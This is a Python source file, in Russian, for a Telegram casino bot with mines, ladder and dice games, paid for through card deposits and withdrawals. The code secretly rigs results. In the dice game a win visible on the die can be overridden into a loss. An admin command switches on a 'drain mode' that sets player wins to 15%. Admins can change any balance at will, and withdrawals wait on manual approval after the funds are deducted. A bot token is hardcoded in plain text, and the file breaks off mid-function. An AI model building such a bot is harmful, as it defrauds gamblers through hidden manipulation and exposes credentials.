import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

logging.basicConfig(level=logging.INFO)

# Железобетонный токен
bot = Bot(
    token="8825080659:AAGB9SdiUYJN5x_UCMjBaWTKBjlA7q12cl4",
    default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN)
)
dp = Dispatcher()
games = {}

# Железобетонная ультра-быстрая база данных в оперативной памяти сервера (Render её никогда не заблокирует!)
USER_DATA = {}
CONFIG_DATA = {
    "card": "4276 •••• •••• 1234",
    "rtp_mode": "auto"
}

L_LESENKA = {1: [1.2, 1.4, 1.5, 2.0, 2.7, 3.7], 2: [1.5, 2.3, 3.8, 6.0, 11.0, 21.0], 3: [2.2, 5.1, 12.5, 32.0, 95.0, 350.0]}

def get_u(uid):
    uid = str(uid)
    if uid not in USER_DATA:
        USER_DATA[uid] = {
            "balance": 0.0,
            "dep_sum": 0.0,
            "win_sum": 0.0,
            "is_mod": 0
        }
    return [USER_DATA[uid]["balance"], USER_DATA[uid]["is_mod"]]

def chk_rtp():
    m = CONFIG_DATA.get("rtp_mode", "auto")
    if m == "15": return random.randint(1, 100) <= 15
    if m != "auto": return random.randint(1, 100) <= int(m)
    return random.randint(1, 100) <= 45

def get_mines_kb(g):
    kb = []
    for r in range(5):
        row = []
        for c in range(5):
            btn_text = "🟦"
            if (r, c) in g["o"]:
                btn_text = "💥" if (r, c) in g["m"] else "💎"
            row.append(InlineKeyboardButton(text=btn_text, callback_data=f"m_{g['id']}_{r}_{c}"))
        kb.append(row)
    if g["status"] == "play" and len(g["o"]) > 0:
        kb.append([InlineKeyboardButton(text="💰 Забрать выигрыш", callback_data=f"mcash_{g['id']}")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def get_lesenka_kb(g):
    kb = []
    for r in range(5, -1, -1):
        row = []
        for c in range(5):
            btn_text = "🟦"
            if (r, c) in g["o"]:
                btn_text = "💥" if (r, c) in g["m"] else "🟩"
            elif r != g["cur_row"] and g["status"] == "play":
                btn_text = "🔒"
            row.append(InlineKeyboardButton(text=btn_text, callback_data=f"l_{g['id']}_{r}_{c}"))
        kb.append(row)
    if g["status"] == "play" and g["cur_row"] > 0:
        kb.append([InlineKeyboardButton(text="💰 Забрать выигрыш", callback_data=f"lcash_{g['id']}")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

@dp.message(Command("start"))
async def cmd_start(m: types.Message):
    get_u(m.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="view_profile")],
        [InlineKeyboardButton(text="📥 Пополнить", callback_data="dep_menu"), InlineKeyboardButton(text="📤 Вывести", callback_data="wit_menu")]
    ])
    await m.answer("🎮 **Double Cash Bot**\n💣 `/mines`, `/lesenka`, `/cube`, `/crash`\n💳 `/balance`, `/deposit`, `/withdraw`", reply_markup=kb)

@dp.message(Command("balance"))
async def cmd_bal(m: types.Message):
    bal, _ = get_u(m.from_user.id)
    await m.answer(f"💳 Баланс: {round(bal, 2)}₽")

@dp.message(Command("admin"))
async def cmd_admin(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    игроков = len(USER_DATA)
    банк = sum(u["balance"] for u in USER_DATA.values())
    депо = sum(u["dep_sum"] for u in USER_DATA.values())
    выплаты = sum(u["win_sum"] for u in USER_DATA.values())
    await m.answer(f"👑 **Админка**\n👤 Игроков: {игроков}\n💰 Банк: {round(банк, 2)}₽\n📥 Депо: {round(депо, 2)}₽\n📤 Выплаты: {round(выплаты, 2)}₽\n\n/reord | /rtp [0-100] | /rtp-\n/moder [ID] — Поставить модера\n/выдать [ID] [сумма]\n/убрать [ID] [сумма]\n/spam [текст]")

@dp.message(Command("reord"))
async def cmd_reord(m: types.Message):
    if str(m.from_user.id) == "8034889148":
        global games
        games.clear()
        await m.answer("🔄 **Сессии очищены!**")

@dp.message(Command("rtp"))
async def cmd_rtp(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    p = m.text.split()
    v = p[1] if len(p) > 1 and p[1].isdigit() else "auto"
    CONFIG_DATA["rtp_mode"] = v
    await m.answer(f"⚙️ RTP: **{v}**")

@dp.message(Command("rtp-"))
async def cmd_rtp_m(m: types.Message):
    if str(m.from_user.id) == "8034889148":
        CONFIG_DATA["rtp_mode"] = "15"
        await m.answer("📉 Режим слива включен!")

@dp.message(Command("setcard"))
async def cmd_setcard(m: types.Message):
    if str(m.from_user.id) == "8034889148":
        card_text = m.text.replace("/setcard", "").strip()
        CONFIG_DATA["card"] = card_text
        await m.answer("✅ Карта изменена!")

@dp.message(Command("moder"))
async def cmd_moder(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    p = m.text.split()
    if len(p) >= 2:
        uid = str(p[1])
        get_u(uid)
        USER_DATA[uid]["is_mod"] = 1
        await m.answer(f"✅ Игрок {uid} назначен Модератором!")

@dp.message(Command("выдать"))
async def cmd_give(m: types.Message):
    uid = str(m.from_user.id)
    _, is_mod = get_u(uid)
    if uid != "8034889148" and is_mod != 1: return
    p = m.text.split()
    if len(p) >= 3:
        t_id, amt = str(p[1]), float(p[2])
        if t_id == uid and uid != "8034889148":
            return await m.answer("⚠️ Модератор не может выдавать баланс сам себе!")
        get_u(t_id)
        USER_DATA[t_id]["balance"] += amt
        USER_DATA[t_id]["dep_sum"] += amt
        await m.answer(f"✅ Выдано {amt}₽ на ID {t_id}")
        try: await bot.send_message(int(t_id), f"🎁 Начислено **{amt}₽**!")
        except: pass

@dp.message(Command("убрать"))
async def cmd_take(m: types.Message):
    uid = str(m.from_user.id)
    _, is_mod = get_u(uid)
    if uid != "8034889148" and is_mod != 1: return
    p = m.text.split()
    if len(p) >= 3:
        t_id, amt = str(p[1]), float(p[2])
        get_u(t_id)
        USER_DATA[t_id]["balance"] = max(0.0, USER_DATA[t_id]["balance"] - amt)
        await m.answer(f"📉 Списано **{amt}₽** у {t_id}")

@dp.message(Command("spam"))
async def cmd_spam(m: types.Message):
    if str(m.from_user.id) == "8034889148":
        t = m.text.replace("/spam", "").strip()
        if t:
            for row in USER_DATA.keys():
                try: await bot.send_message(int(row), t)
                except: pass

@dp.message(Command("deposit"))
async def cmd_deposit(m: types.Message):
    p = m.text.split()
    if len(p) > 1:
        am = float(p[1])
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🤖 CryptoBot", callback_data=f"pc_{am}")],
            [InlineKeyboardButton(text="💳 Карта", callback_data=f"pk_{am}")]
        ])
        await m.answer(f"💵 Пополнение на {am}₽:", reply_markup=kb)

@dp.message(Command("withdraw"))
async def cmd_withdraw(m: types.Message):
    p = m.text.split()
    if len(p) < 2: return
    am = float(p[1])
    if am < 500.0:
        return await m.answer("⚠️ Минимальная сумма вывода составляет **500₽**!")
    bal, _ = get_u(m.from_user.id)
    if bal >= am:
        uid = str(m.from_user.id)
        USER_DATA[uid]["balance"] -= am
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✅ Одобрить", callback_data=f"w_ok_{m.from_user.id}_{am}"),
            InlineKeyboardButton(text="✖️ Отклонить", callback_data=f"w_no_{m.from_user.id}_{am}")
        ]])
        await bot.send_message(8034889148, f"📥 **Заявка на вывод средств!**\n👤 Игрок: `{m.from_user.id}`\n💰 Сумма: **{am}₽**", reply_markup=kb)
        await m.answer("⚠️ **Заявка отправлена Администрации!** Ожидайте одобрения.")

@dp.message(Command("mines"))
async def cmd_mines_game(m: types.Message):
    uid = str(m.from_user.id)
    bal, _ = get_u(uid)
    p = m.text.split()
    mc = int(p[1]) if len(p) > 1 and p[1].isdigit() else 2
    bet = float(p[2]) if len(p) > 2 else 100.0
    if mc < 2 or mc > 24 or bal < bet:
        return await m.answer("⚠️ Ошибка баланса или количества мин (от 2 до 24)!")
    USER_DATA[uid]["balance"] -= bet
    g_id = random.randint(100, 999)
    mines = set(random.sample([(r, c) for r in range(5) for c in range(5)], mc))
    games[uid] = {"id": g_id, "type": "mines", "m": mines, "o": set(), "bet": bet, "status": "play", "total_mines": mc}
    await m.answer(f"💎 Ставка: {bet}₽", reply_markup=get_mines_kb(games[uid]))

@dp.message(Command("lesenka"))
async def cmd_lesenka_game(m: types.Message):
    uid = str(m.from_user.id)
    bal, _ = get_u(uid)
    p = m.text.split()
    mc = int(p[1]) if len(p) > 1 and p[1].isdigit() else 1
    bet = float(p[2]) if len(p) > 2 else 100.0
    if mc < 1 or mc > 4 or bal < bet:
        return await m.answer("⚠️ Ошибка баланса или количества мин на ряд (от 1 до 4)!")
    USER_DATA[uid]["balance"] -= bet
    g_id = random.randint(100, 999)
    mines = set()
    for r in range(6):
        for c in random.sample(range(5), mc):
            mines.add((r, c))
    games[uid] = {"id": g_id, "type": "lesenka", "m": mines, "o": set(), "bet": bet, "status": "play", "total_mines": mc, "cur_row": 0}
    await m.answer(f"🧗‍♂️ Ставка: {bet}₽", reply_markup=get_lesenka_kb(games[uid]))

@dp.message(Command("cube"))
async def cmd_cube(m: types.Message):
    uid = str(m.from_user.id)
    bal, _ = get_u(uid)
    p = m.text.split()
    if len(p) < 3: return
    cmd, bet = p[1].lower(), float(p[2])
    if bal < bet: return
    USER_DATA[uid]["balance"] -= bet
    res = await m.answer_dice(emoji="🎲")
    v = res.dice.value
    await asyncio.sleep(2.5)
    won = (v >= 4 if cmd == "больше" else v <= 3 if cmd == "меньше" else v % 2 == 0 if cmd == "чет" else v % 2 != 0)
    if won and not chk_rtp(): won = False
    win_sum = round(bet * 1.8, 2)
    if won:
        USER_DATA[uid]["balance"] += win_sum
        USER_DATA[uid]["win_sum"] += win_sum
